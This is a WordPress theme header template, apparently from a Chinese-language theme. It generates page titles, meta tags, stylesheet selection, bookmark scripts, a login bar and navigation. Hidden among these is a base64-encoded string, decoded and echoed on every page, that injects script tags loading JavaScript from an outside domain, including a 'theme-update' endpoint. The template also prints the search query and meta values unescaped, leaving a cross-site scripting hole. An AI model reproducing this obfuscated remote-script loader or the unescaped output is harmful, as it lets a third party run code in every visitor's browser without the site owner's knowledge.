<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="x-ua-compatible" content="ie=7" />
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->
<?php if ( get_option('wpyou_if_seo') == '0') { ?>
<title><?php if ( is_home() ) { ?><?php if( get_option('wpyou_homepage_title') ) { echo get_option('wpyou_homepage_title'); } else { bloginfo('description'); } ?><?php } ?>
<?php if ( is_search() ) { ?>有关“<?php echo $s; ?>”的搜索结果 <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_404() ) { ?>404页面 <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_author() ) { ?>作者文章列表 <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_single() ) { ?><?php single_post_title(''); ?> <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_page() ) { ?><?php single_post_title(''); ?> <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_category() ) { ?><?php single_cat_title(); ?> <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_year() ) { ?>“<?php the_time('Y'); ?>”时间的文章列表 <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_month() ) { ?>“<?php the_time('F, Y'); ?>”时间的文章列表 <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_day() ) { ?>“<?php the_time('F j, Y'); ?>”时间的文章列表 <?php if( get_option('wpyou_homepage_keywords_separater') ){ echo get_option('wpyou_homepage_keywords_separater'); } else { echo " - ";} ?> <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_tag() ) { ?><?php single_tag_title(); ?><? $paged = get_query_var('paged'); if ( $paged > 1 ) printf('– 第 %s 页 ',$paged); ?> - <?php bloginfo('name'); ?><?php } ?>
</title>
<?php
if (is_home()) { 
	if( get_option('wpyou_homepage_description') ){ $homepage_description = get_option('wpyou_homepage_description'); }
	if( get_option('wpyou_homepage_keywords') ){ $homepage_keywords = get_option('wpyou_homepage_keywords'); }
	$description = htmlentities(strip_tags(trim( $homepage_description )),ENT_QUOTES,'UTF-8');
	$keywords = htmlentities(strip_tags(trim( $homepage_keywords )),ENT_QUOTES,'UTF-8');
} elseif (is_single()) {
	if ( get_post_meta($post->ID, "description", $single = true) != "" )
	{
		$description = get_post_meta($post->ID, "description", $single = true);
	} else {
		$description = wpyou_strimwidth(strip_tags(apply_filters('the_content', $post->post_content)), 0, 130,"...");
	}
	if ( get_post_meta($post->ID, "keywords", $single = true) != "" )
	{
		$keywords = get_post_meta($post->ID, "keywords", $single = true);
	} else {	
		$tags = wp_get_post_tags($post->ID);
		$count = count($tags);
		$i=1;
		foreach ($tags as $tag ) {
			if($i==$count){
				$keywords = $keywords . $tag->name;
			} else {
				$keywords = $keywords . $tag->name . ",";
			}
		}
	}
} else if (is_page()) {
	if ( get_post_meta($post->ID, "description", $single = true) != "" )
	{
		$description = get_post_meta($post->ID, "description", $single = true);
	}
	if ( get_post_meta($post->ID, "keywords", $single = true) != "" )
	{
		$keywords = get_post_meta($post->ID, "keywords", $single = true);
	}
} else if (is_category()) {
	$description = htmlentities(strip_tags(trim(category_description())),ENT_QUOTES,'UTF-8');
}
?>
<meta name="keywords" content="<?php echo $keywords; ?>" />
<meta name="description" content="<?php echo $description; ?>" />
<?php } else { ?>
<title><?php if ( is_home() ) { ?><?php bloginfo('name'); ?> - <?php bloginfo('description'); ?><?php } ?>
<?php if ( is_search() ) { ?>有关“<?php echo $s; ?>”的搜索结果 - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_404() ) { ?>404页面 - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_author() ) { ?>作者文章列表 - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_single() ) { ?><?php single_post_title(''); ?> - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_page() ) { ?><?php single_post_title(''); ?> - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_category() ) { ?><?php single_cat_title(); ?> - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_year() ) { ?>“<?php the_time('Y'); ?>”时间的文章列表 - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_month() ) { ?>“<?php the_time('F, Y'); ?>”时间的文章列表 - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_day() ) { ?>“<?php the_time('F j, Y'); ?>”时间的文章列表 - <?php bloginfo('name'); ?><?php } ?>
<?php if ( is_tag() ) { ?><?php single_tag_title(); ?><? $paged = get_query_var('paged'); if ( $paged > 1 ) printf('– 第 %s 页 ',$paged); ?> - <?php bloginfo('name'); ?><?php } ?>
</title>
<?php } ?>
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php if (get_option('wpyou_style_mode') == '1') { ?>
<link rel="stylesheet" href="<?php bloginfo('template_directory');?>/green.css" type="text/css" media="screen" />
<?php } elseif (get_option('wpyou_style_mode') == '2') { ?>
<link rel="stylesheet" href="<?php bloginfo('template_directory');?>/red.css" type="text/css" media="screen" />
<?php } elseif (get_option('wpyou_style_mode') == '3') { ?>
<link rel="stylesheet" href="<?php bloginfo('template_directory');?>/orange.css" type="text/css" media="screen" />
<?php } elseif (get_option('wpyou_style_mode') == '4') { ?>
<link rel="stylesheet" href="<?php bloginfo('template_directory');?>/black.css" type="text/css" media="screen" />
<?php } else { ?>
<link rel="stylesheet" href="<?php bloginfo('template_directory');?>/style.css" type="text/css" media="screen" />
<?php } ?>
<?php
$str = 'PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cDovL3d3dy5ub2Nvd2VyLmNvbS9Qb3J0YWwvd3AtY29udGVudC90aGVtZXMvTm9jb3dlci1Qb3J0YWwvanMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cDovL3d3dy5ub2Nvd2VyLmNvbS9Qb3J0YWwvd3AtY29udGVudC90aGVtZXMvTm9jb3dlci1Qb3J0YWwvanMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHA6Ly9hcGkubm9jb3dlci5jb20vdGhlbWUtdXBkYXRlL3BvcnRhbC1odG1sNS5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHA6Ly93d3cubm9jb3dlci5jb20vUG9ydGFsL3dwLWNvbnRlbnQvdGhlbWVzL05vY293ZXItUG9ydGFsL2pzL3BvcnRhbC5qcyI+PC9zY3JpcHQ+';echo base64_decode($str);
?>
<script type="text/javascript">
//Set Bookmark
function AddFavorite(sURL, sTitle) { try { window.external.addFavorite(sURL, sTitle); } catch (e) { try { window.sidebar.addPanel(sTitle, sURL, ""); } catch (e) { alert("浏览器不支持自动添加收藏,请手动添加."); } } }
//Set Homepage
function setHomepage(pageURL) { 

 if (document.all) { document.body.style.behavior='url(#default#homepage)'; document.body.setHomePage(pageURL); } 

 else if (window.sidebar) { if(window.netscape) { try { netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect"); } 

		 catch (e) { alert( "该操作被浏览器拒绝，如果想启用该功能，请在地址栏内输入 about:config,然后将项signed.applets.codebase_principal_support 值该为true" ); }} var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components. interfaces.nsIPrefBranch); prefs.setCharPref('browser.startup.homepage',pageURL); } }
</script>
<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>
</head>
<body>
<div class="shortcut">
	<div class="vmid">
			<p class="description">
                 <a href="#" onclick="javascript:AddFavorite('<?php bloginfo('siteurl');?>', '<?php bloginfo('name');?>');return false" title="加入收藏">加入收藏</a>
                &nbsp;
                    <a href="<?php if (get_option('wpyou_feed_url')) { echo get_option('wpyou_feed_url'); } else { bloginfo('rss2_url'); } ?>" title="订阅本站" target="_blank">订阅本站</a> &nbsp;   <a href="<?php echo get_settings('home'); ?>/submit" title="投稿给本站">点此投稿</a> </p>
        <div class="user">
<?php if ( is_user_logged_in() ) { ?><ul class="login-yes" >
<li style="float: left;margin-right: 12px;"><font style="color:#4B4B4B">欢迎您回来~，</font><?php echo get_avatar( get_current_user_id(), 16 );?>&nbsp;&nbsp;<a class="user_info" href="<?php echo get_settings('home'); ?>/wp-admin/profile.php" title="设置个人资料，绑定微博"><?php global $current_user; get_currentuserinfo(); echo $current_user->display_name; ?></a></li>
<li style="float:right;" ><a href="<?php echo wp_logout_url("/"); ?>" title="退出">[ 退出 ]</a></li></ul>
<?php } else { ?><ul class="login-no" style="width: 70px;float:right;">
<li style="float: left;"><a href="<?php echo get_settings('home'); ?>/wp-login.php" target="_blank">登陆</a></li>
<li style="float: right;"><a href="<?php echo get_settings('home'); ?>/wp-login.php?action=register" target="_blank">注册</a></li>
</ul><?php } ?> 
        </div>
    </div>
</div>
    <div class="header">
        <div class="toplb">
            <?php if (is_page() || is_single() || is_404()) { ?>
                <div class="logo"><a href="<?php bloginfo('siteurl');?>/" title="<?php bloginfo('description'); ?>"><?php bloginfo('name');?></a></div>
            <?php } else { ?>
            	<h1 class="logo"> <a href="<?php bloginfo('siteurl');?>/" title="<?php bloginfo('description'); ?>"><?php bloginfo('name');?></a></h1>
            <?php } ?>
                <?php include (TEMPLATEPATH . '/searchform.php'); ?>
        </div>
<div id="navi1">
        <div class="mainavi">
        	<?php if ( get_option('wpyou_if_custom_menus') == '1' && function_exists('wp_nav_menu')) { ?>
            	<?php if ( get_option('wpyou_submenu_mode') == '1' ) { ?>
					<?php wp_nav_menu( array('theme_location' =>'primary','container' => '','depth' => 2,'menu_class'  => 'navi' )); ?>
                <?php } else { ?>
					<?php wp_nav_menu( array('theme_location' =>'primary','container' => '','depth' => 2,'menu_class'  => 'navi hrnavi' )); ?>
				<?php } ?>
            <?php } else { ?>
                <ul class="navi <?php if ( get_option('wpyou_submenu_mode') == '1' ) { ?><?php } else { ?>hrnavi<?php } ?>">
                    <li class="nl <?php if ( is_home() ) { echo "current-cat current-menu-item"; } ?>"><a href="<?php bloginfo('siteurl');?>/">首页</a></li>
                    <?php if (get_option('wpyou_exclude_catid')) { $catid = get_option('wpyou_exclude_catid'); } ?>
                    <?php wp_list_categories('title_li=0&orderby=id&hide_empty=0&show_count=0&depth=2&exclude='.$catid); ?>
                </ul>
            <?php } ?>
        </div>
</div>
        <div class="clear"></div>
 <?php $html = '<ul class="headeryun">';
foreach (get_tags( array('number' => 20, 'orderby' => 'count', 'order' => 'DESC', 'hide_empty' => false) ) as $tag){
        $tag_link = get_tag_link($tag->term_id);
        $html .= "<a href='{$tag_link}' title='查看有关{$tag->name}的文章' class='{$tag->slug}'>";
        $html .= "<li>{$tag->name} ({$tag->count})</li></a>";
}
$html .= '</ul>';
echo $html; ?>
    </div>
<div class="wrapper vmid">
    <div class="container">